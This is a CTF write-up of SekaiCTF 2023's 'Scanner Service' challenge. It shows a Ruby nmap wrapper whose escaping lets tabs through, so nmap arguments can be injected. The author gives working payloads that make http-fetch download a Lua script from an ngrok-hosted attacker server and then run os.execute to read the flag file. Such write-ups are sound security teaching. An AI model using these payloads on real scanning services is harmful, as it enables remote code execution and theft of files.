# Scanner Service

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 146 solves / 100 points
- Difficulty level: 1
- Author: irogir
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829153250.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829153430.png)

In here, we can perform a vulnerability scanning for a target.

We can try to scan the web server itself:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829153615.png)

As you can see, it's using Nmap scanner.

**Burp Suite's HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829154914.png)

When we clicked the "Scan" button, it'll send a POST request to `/` with `service` POST parameter.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/Web/Scanner-Service/dist.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2023/Web/Scanner-Service)-[2023.08.29|15:38:00(HKT)]
└> file dist.zip 
dist.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2023/Web/Scanner-Service)-[2023.08.29|15:38:01(HKT)]
└> unzip dist.zip 
Archive:  dist.zip
  inflating: Dockerfile              
  inflating: build-docker.sh         
   creating: config/
  inflating: config/supervisord.conf  
 extracting: flag.txt                
   creating: src/
 extracting: src/Gemfile             
  inflating: src/Gemfile.lock        
   creating: src/app/
   creating: src/app/controllers/
  inflating: src/app/controllers/scanner.rb  
   creating: src/app/helper/
  inflating: src/app/helper/scanner_helper.rb  
   creating: src/app/views/
  inflating: src/app/views/index.erb  
   creating: src/config/
  inflating: src/config/environment.rb  
 extracting: src/config.ru           
   creating: src/public/
   creating: src/public/stylesheets/
  inflating: src/public/stylesheets/style.css  
```

**Dockerfile:**
```shell
FROM ruby:2.7.5-alpine3.15

RUN apk add --update --no-cache supervisor

RUN adduser -D -u 1000 -g 1000 -s /bin/sh www

RUN mkdir /app
COPY src/ /app
COPY config/supervisord.conf /etc/supervisord.conf

COPY flag.txt /flag.txt

RUN mv /flag.txt /flag-$(head -n 1000 /dev/random | md5sum | head -c 32).txt

WORKDIR /app
RUN bundle install

RUN apk add nmap nmap-scripts --no-cache && rm -f /var/cache/apk/*

EXPOSE 1337

ENTRYPOINT ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

In this `Dockerfile` Docker's build image script, it's pulling the Ruby image, installing `nmap`, `nmap-scripts`, and other stuff.

**In `src/app/controllers/scanner.rb`, we can see how the index route (`/`) works:**
```ruby
require 'sinatra/base'
require_relative '../helper/scanner_helper'

class ScanController < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    erb :'index'
  end

  post '/' do
    input_service = escape_shell_input(params[:service])
    hostname, port = input_service.split ':', 2
    begin
      if valid_ip? hostname and valid_port? port
        # Service up?
        s = TCPSocket.new(hostname, port.to_i)
        s.close
        # Assuming valid ip and port, this should be fine
        @scan_result = IO.popen("nmap -p #{port} #{hostname}").read
      else
        @scan_result = "Invalid input detected, aborting scan!"
      end
    rescue Errno::ECONNREFUSED
      @scan_result = "Connection refused on #{hostname}:#{port}"
    rescue => e
      @scan_result = e.message
    end

    erb :'index'
  end

end
```

**When a POST request is sent to `/`, it'll call function `escape_shell_input()` with POST parameter `service`. This function is defined in `src/app/helper/scanner_helper.rb`:**
```ruby
# chatgpt code :-)
def escape_shell_input(input_string)
  escaped_string = ''
  input_string.each_char do |c|
    case c
    when ' '
      escaped_string << '\\ '
    when '$'
      escaped_string << '\\$'
    when '`'
      escaped_string << '\\`'
    when '"'
      escaped_string << '\\"'
    when '\\'
      escaped_string << '\\\\'
    when '|'
      escaped_string << '\\|'
    when '&'
      escaped_string << '\\&'
    when ';'
      escaped_string << '\\;'
    when '<'
      escaped_string << '\\<'
    when '>'
      escaped_string << '\\>'
    when '('
      escaped_string << '\\('
    when ')'
      escaped_string << '\\)'
    when "'"
      escaped_string << '\\\''
    when "\n"
      escaped_string << '\\n'
    when "*"
      escaped_string << '\\*'
    else
      escaped_string << c
    end
  end

  escaped_string
end
```

Basically, this function is escaping the shell metacharacters. (See [PHP's `escapeshellcmd()` function(https://www.php.net/manual/en/function.escapeshellcmd.php)].)

**However, some characters are not escaped:**
```
!@#%^-_=+[]:/?.,~{}
```

**After escaping the `service` POST parameter, it'll validate the hostname and port, and check the service is up or not:**
```ruby
[...]
hostname, port = input_service.split ':', 2
    begin
      if valid_ip? hostname and valid_port? port
        # Service up?
        s = TCPSocket.new(hostname, port.to_i)
        s.close
        [...]
```

```ruby
def valid_port?(input)
  !input.nil? and (1..65535).cover?(input.to_i)
end

def valid_ip?(input)
  pattern = /\A((25[0-5]|2[0-4]\d|[01]?\d{1,2})\.){3}(25[0-5]|2[0-4]\d|[01]?\d{1,2})\z/
  !input.nil? and !!(input =~ pattern)
end
```

**Then, after validating those things, it'll run system command `nmap -p #{port} #{hostname}`:**
```ruby
        [...]
        # Assuming valid ip and port, this should be fine
        @scan_result = IO.popen("nmap -p #{port} #{hostname}").read
      else
        @scan_result = "Invalid input detected, aborting scan!"
      end
    rescue Errno::ECONNREFUSED
      @scan_result = "Connection refused on #{hostname}:#{port}"
    rescue => e
      @scan_result = e.message
    end

    erb :'index'
  end

end
```

Hmm... I wonder **if it's vulnerable to OS command injection, Server-Side Template Injection (SSTI), or Server-Side Request Forgery (SSRF).**

As for SSRF, although there's no IP whitelist/blacklist and able to scan the internal network via the provided Nmap scanner, we don't know what we need to do in the internal network.

In SSTI, the template engine is ERB, and it looks like we can control the hostname and port.

In OS command injection, it seems like **the filter is bypassable via newline (`\n`, `%0a`) or tab (`\t`, `%09`) character.**

## Exploitation

**Anyway, let's build the Docker image and test the application locally:**
```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2023/Web/Scanner-Service)-[2023.08.29|16:03:47(HKT)]
└> sudo sh ./build-docker.sh 
Sending build context to Docker daemon  28.16kB
Step 1/13 : FROM ruby:2.7.5-alpine3.15
 ---> 016024d655c5
[...]
[2023-08-29 08:04:07] INFO  WEBrick 1.6.1
[2023-08-29 08:04:07] INFO  ruby 2.7.5 (2021-11-24) [x86_64-linux-musl]
[2023-08-29 08:04:07] INFO  WEBrick::HTTPServer#start: pid=7 port=1337
2023-08-29 08:04:08,983 INFO success: app entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
```

**After some testing, SSTI doesn't work because the escaped characters:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829160806.png)

**Then, in OS command injection, I tried to the newline character to inject system commands, but no dice:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829161001.png)

```
172.17.0.1 - - [29/Aug/2023:08:09:05 +0000] "POST / HTTP/1.1" 200 765 0.0944
Error #487: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"
QUITTING!
```

**Luckily, we can perform argument injection via the tab character:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829161120.png)

Now, what should we need do in order to read the flag?

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/), we can try to execute system commands via `--script` option:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829161337.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829161428.png)

```
172.17.0.1 - - [29/Aug/2023:08:13:46 +0000] "POST / HTTP/1.1" 200 766 0.4566
NSE: failed to initialize the script engine:
/usr/bin/../share/nmap/nse_main.lua:822: ''os.execute("id")'' did not match a category, filename, or directory
stack traceback:
	[C]: in function 'error'
	/usr/bin/../share/nmap/nse_main.lua:822: in local 'get_chosen_scripts'
	/usr/bin/../share/nmap/nse_main.lua:1322: in main chunk
	[C]: in ?

QUITTING!
```

Ahh! The escape character filter!

**After some trial and error, I found that we can download arbitrary files to the target machine via `http-fetch` module!** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829161611.png)

**And it doesn't contain any characters in the filter!**

**So, the payload to upload our files will be:**
```
service=172.17.0.1:80%09--script%09http-fetch%09--script-args%09http-fetch.destination=/tmp,http-fetch.url=/payload.nse
```

1. Run `http-fetch` module with `--script http-fetch`
2. Provide `http-fetch` module's arguments. `http-fetch.destination=/tmp` will save the downloaded file to `/tmp` directory, `http-fetch.url` will download the `payload.nse` file from our attacker machine.

**`payload.nse`:**
```lua
os.execute('cat /flag-*')
```

This Lua script (Nmap scripts are written in Lua) will execute OS command `cat /flag-*`, which will then read the flag file's content.

- Host the `payload.nse` payload script via Python's `http.server` module:

```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2023/Web/Scanner-Service)-[2023.08.29|16:40:19(HKT)]
└> cat payload.nse 
os.execute('cat /flag-*')
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2023/Web/Scanner-Service)-[2023.08.29|16:40:20(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

- Upload the payload script via Nmap's `http-fetch` module:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829164105.png)

- Run the uploaded script:

```
service=172.17.0.1:80%09--script%09/tmp/172.17.0.1/80/payload.nse
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829164129.png)

Nice! Let's repeat the above steps to get the real flag!

```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2023/Web/Scanner-Service)-[2023.08.29|16:42:30(HKT)]
└> ngrok tcp 80
[...]
Forwarding                    tcp://0.tcp.ap.ngrok.io:16840 -> localhost:80
```

> Note: If you're using Ngrok like me, in order to get rid of the hostname filter, we need to get the IP address of the Ngrok's hostname.

```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2023/Web/Scanner-Service)-[2023.08.29|16:47:46(HKT)]
└> ping 0.tcp.ap.ngrok.io                                  
PING 0.tcp.ap.ngrok.io (13.229.3.203) 56(84) bytes of data.
64 bytes from ec2-13-229-3-203.ap-southeast-1.compute.amazonaws.com (13.229.3.203): icmp_seq=1 ttl=128 time=34.0 ms
[...]
```

```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2023/Web/Scanner-Service)-[2023.08.29|16:42:25(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829165106.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2023/images/Pasted%20image%2020230829165120.png)

- **Flag: `SEKAI{4r6um3n7_1nj3c710n_70_rc3!!}`**

## Conclusion

What we've learned:

1. Exploiting arugment injection